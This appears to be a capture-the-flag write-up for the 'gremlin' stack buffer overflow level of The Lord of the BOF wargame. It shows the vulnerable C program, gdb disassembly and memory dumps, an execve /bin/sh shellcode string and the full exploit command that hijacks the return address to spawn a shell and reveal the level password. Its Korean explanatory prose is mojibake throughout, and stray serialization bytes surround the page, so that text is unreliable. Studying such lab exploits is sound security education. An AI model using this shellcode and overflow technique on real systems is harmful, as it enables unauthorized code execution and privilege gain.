I"ò%<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>login: gate
Password:
Last login: Sat Feb 27 11:04:23 on tty1
<span class="o">[</span>gate@localhost gate]<span class="nv">$ </span><span class="nb">ls
</span>gremlin  gremlin.c
<span class="o">[</span>gate@localhost gate]<span class="nv">$ </span><span class="nb">cat </span>gremlin.c
/<span class="k">*</span>
        The Lord of the BOF : The Fellowship of the BOF
        - gremlin
        - simple BOF
<span class="k">*</span>/

int main<span class="o">(</span>int argc, char <span class="k">*</span>argv[]<span class="o">)</span>
<span class="o">{</span>
    char buffer[256]<span class="p">;</span>
    <span class="k">if</span><span class="o">(</span>argc &lt; 2<span class="o">){</span>
        <span class="nb">printf</span><span class="o">(</span><span class="s2">"argv error</span><span class="se">\n</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
        <span class="nb">exit</span><span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
    <span class="o">}</span>
    strcpy<span class="o">(</span>buffer, argv[1]<span class="o">)</span><span class="p">;</span>
    <span class="nb">printf</span><span class="o">(</span><span class="s2">"%s</span><span class="se">\n</span><span class="s2">"</span>, buffer<span class="o">)</span><span class="p">;</span>
<span class="o">}</span>
</code></pre></div></div>
<p>gate/gateë¡œ ë¡œê·¸ì¸í•˜ì.
í•´í‚¹í•  í”„ë¡œê·¸ë¨ì˜ ì†ŒìŠ¤ íŒŒì¼ì„ ì£¼ì—ˆìœ¼ë¯€ë¡œ ì½ì–´ì™”ë‹¤.
strcpyë¥¼ í•˜ë©° ë²„í¼ì˜¤ë²„í”Œë¡œìš°ê°€ ì¼ì–´ë‚œë‹¤.
LOBì—ì„œëŠ” í™˜ê²½ë³€ìˆ˜ë¥¼ ê°€ëŠ¥í•˜ë©´ ì‚¬ìš©í•˜ì§€ ì•Šê² ë‹¤.</p>

<p>ìš°ì„  ì†ŒìŠ¤ íŒŒì¼ì„ ë³µì‚¬í•´ ì»´íŒŒì¼í•˜ì.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>gate@localhost gate]<span class="nv">$ </span><span class="nb">mkdir </span>tmp
<span class="o">[</span>gate@localhost gate]<span class="nv">$ </span><span class="nb">cp </span>gremlin.c tmp
<span class="o">[</span>gate@localhost gate]<span class="nv">$ </span><span class="nb">cd </span>tmp
<span class="o">[</span>gate@localhost tmp]<span class="nv">$ </span><span class="nb">ls
</span>gremlin.c
<span class="o">[</span>gate@localhost tmp]<span class="nv">$ </span>gcc <span class="nt">-o</span> gremlin gremlin.c
</code></pre></div></div>
<p>LOBëŠ” bash2ë¼ëŠ” ëª…ë ¹ì–´ë¥¼ ì¹œ í›„ì— í’€ì–´ì•¼ í•œë‹¤ê³  í•œë‹¤.
ë˜í•œ ë‚®ì€ ë²„ì „ì˜ gcc ì»´íŒŒì¼ëŸ¬ë¥¼ ì‚¬ìš©í•˜ê¸° ë•Œë¬¸ì— ì»´íŒŒì¼ì„ í•´ë„ ë”ë¯¸ê°€ ìƒê¸°ì§€ ì•ŠëŠ”ë‹¤. ê·¸ëŸ¬ë¯€ë¡œ ì†ŒìŠ¤ë§Œ ë³´ì•„ë„ RETê¹Œì§€ì˜ ìœ„ì¹˜ë¥¼ ì•Œ ìˆ˜ ìˆë‹¤.
ìœ„ë¥¼ ì˜ˆë¡œ ë“¤ë©´ SFTê¹Œì§€ëŠ” 256+4=260, RETê¹Œì§€ëŠ” 260+4=264.
ì •ë§ ê³„ì‚°ì´ ê°„ë‹¨í•´ì§„ë‹¤.
í™˜ê²½ ë³€ìˆ˜ë¥¼ ì‚¬ìš©í•˜ë©´ ê¸ˆë°© í’€ê² ì§€ë§Œ ì•„ê¹Œ ë§í–ˆë“¯ í™˜ê²½ë³€ìˆ˜ëŠ” ì‚¬ìš©ì„ ìì œí•˜ê² ë‹¤.
ê·¸ëŸ¬ë¯€ë¡œ gdbë¥¼ í†µí•´ í’€ì.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>gate@localhost tmp]<span class="nv">$ </span>gdb <span class="nt">-q</span> gremlin
<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set </span>disassembly-flavor intel
<span class="o">(</span>gdb<span class="o">)</span> disas main
Dump of assembler code <span class="k">for function </span>main:
0x8048430 &lt;main&gt;:       push   %ebp
0x8048431 &lt;main+1&gt;:     mov    %ebp,%esp
0x8048433 &lt;main+3&gt;:     sub    %esp,0x100
0x8048439 &lt;main+9&gt;:     cmp    DWORD PTR <span class="o">[</span>%ebp+8],1
0x804843d &lt;main+13&gt;:    jg     0x8048456 &lt;main+38&gt;
0x804843f &lt;main+15&gt;:    push   0x80484e0
0x8048444 &lt;main+20&gt;:    call   0x8048350 &lt;<span class="nb">printf</span><span class="o">&gt;</span>
0x8048449 &lt;main+25&gt;:    add    %esp,4
0x804844c &lt;main+28&gt;:    push   0
0x804844e &lt;main+30&gt;:    call   0x8048360 &lt;<span class="nb">exit</span><span class="o">&gt;</span>
0x8048453 &lt;main+35&gt;:    add    %esp,4
0x8048456 &lt;main+38&gt;:    mov    %eax,DWORD PTR <span class="o">[</span>%ebp+12]
0x8048459 &lt;main+41&gt;:    add    %eax,4
0x804845c &lt;main+44&gt;:    mov    %edx,DWORD PTR <span class="o">[</span>%eax]
0x804845e &lt;main+46&gt;:    push   %edx
0x804845f &lt;main+47&gt;:    lea    %eax,[%ebp-256]
0x8048465 &lt;main+53&gt;:    push   %eax
0x8048466 &lt;main+54&gt;:    call   0x8048370 &lt;strcpy&gt;
0x804846b &lt;main+59&gt;:    add    %esp,8
0x804846e &lt;main+62&gt;:    lea    %eax,[%ebp-256]
0x8048474 &lt;main+68&gt;:    push   %eax
0x8048475 &lt;main+69&gt;:    push   0x80484ec
0x804847a &lt;main+74&gt;:    call   0x8048350 &lt;<span class="nb">printf</span><span class="o">&gt;</span>
0x804847f &lt;main+79&gt;:    add    %esp,8
0x8048482 &lt;main+82&gt;:    leave
0x8048483 &lt;main+83&gt;:    ret
</code></pre></div></div>
<p>strcpyê°€ main+54ì—ì„œ ì¼ì–´ë‚˜ë¯€ë¡œ ê·¸ ë’¤ìª½ì— breakë¥¼ ê±¸ì.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> b<span class="k">*</span>main+59
Breakpoint 1 at 0x804846b
<span class="o">(</span>gdb<span class="o">)</span> 
<span class="o">(</span>gdb<span class="o">)</span> r <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print"A"*260+"BBBB"'</span><span class="si">)</span>
Starting program: /home/gate/tmp/gremlin <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print"A"*260+"BBBB"'</span><span class="si">)</span>
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

<span class="o">(</span>gdb<span class="o">)</span>Breakpoint 1, 0x804846b <span class="k">in </span>main <span class="o">()</span>
<span class="o">(</span>gdb<span class="o">)</span> x/500x <span class="nv">$esp</span>
0xbffff900:     0xbffff908      0xbffffb64      0x41414141      0x41414141
0xbffff910:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff920:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff930:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff940:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff950:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff960:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff970:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff980:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff990:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff9a0:     0x41414141      0x41414141      0x41414141      0x41414141
......
0xbffffb60:     0x006e696c      0x41414141      0x41414141      0x41414141
0xbffffb70:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffb80:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffb90:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffffba0:     0x41414141      0x41414141      0x41414141      0x41414141
</code></pre></div></div>
<p>ë‹¤ë¥¸ í’€ì´ë¥¼ ë³´ë©´ ì…ë ¥ì„ ë°›ì•„ ê°€ì¥ ìœ„ì— ë³´ì´ëŠ” ì…ë ¥ë˜ëŠ” ì£¼ì†Œë¥¼ RETì— ë®ì–´ì“´ë‹¤. ê·¸ëŸ¬ë‚˜ ë‚˜ëŠ” ì…ë ¥ì´ ì € ë°‘ì— í•˜ë‚˜ê°€ ë” ìƒê¸´ë‹¤.
ê·¸ë˜ì„œ ë°‘ì— ìƒê¸´ ì…ë ¥ ì£¼ì†Œë¥¼ RETë¡œ ë„˜ê²¨ì•¼ í’€ë¦°ë‹¤.
(ì‚­ì œ-ì„¤ì¹˜ í…Œí¬ë„ ì‹¤íŒ¨)
ì™œ ì…ë ¥ì´ ë‘ë²ˆ ë˜ëŠ”ê±´ì§€ ì•Œë©´ hello111353@gmail.comìœ¼ë¡œ ë©”ì¼ ë¶€íƒí•œë‹¤ã… ã… 
(êµ¬ê±¸í•  ì •ë„ë¡œ ê¶ê¸ˆí•˜ë‹¤)
ì•„ë¬´íŠ¼, ì…ë ¥ì´ ì‹œì‘ë˜ëŠ” ì£¼ì†ŒëŠ” bffffb60ì´ë¯€ë¡œ ê·¸ ë°‘ì¤„ì˜ ì£¼ì†Œ, ì¦‰ bffffb70ì„ RETë¡œ ë®ì–´ì“°ì.
24byteì˜ ì‰˜ ì½”ë“œë¥¼ ì‚¬ìš©í–ˆë‹¤.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>50<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>2f<span class="se">\x</span>73<span class="se">\x</span>68<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>69<span class="se">\x</span>6e<span class="se">\x</span>89<span class="se">\x</span>e3<span class="se">\x</span>50<span class="se">\x</span>53<span class="se">\x</span>89<span class="se">\x</span>e1<span class="se">\x</span>99<span class="se">\x</span>b0<span class="se">\x</span>0b<span class="se">\x</span><span class="nb">cd</span><span class="se">\x</span>80
</code></pre></div></div>
<p>í™˜ê²½ë³€ìˆ˜ë¥¼ ì“°ì§€ ì•ŠëŠ”ë‹¤ê³  í•´ë„ ì‰˜ ì½”ë“œëŠ” ì‚¬ìš©í•œë‹¤!
gremlin+SFT=260 (256+4)
ì´ë¯€ë¡œ ì‰˜ì½”ë“œì™€ nopìœ¼ë¡œ 260ê°œë¥¼ ì±„ì›Œì•¼ í•œë‹¤.
ê·¸ ë’¤ì— RETì— ë®ì–´ì“¸ ì£¼ì†Œë¥¼ ë„£ì.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./gremlin <span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print"A"*236+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"\x70\xfb\xff\xbf"'</span><span class="si">)</span>
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1í”h//shh/binë¥PSë£ì†»
                 ?p??
bash<span class="nv">$ </span>my-pass
euid <span class="o">=</span> 501
hello bof world
</code></pre></div></div>
<p>ì„±ê³µí–ˆë‹¤.
gateâ€™s password : hello bof world</p>

:ET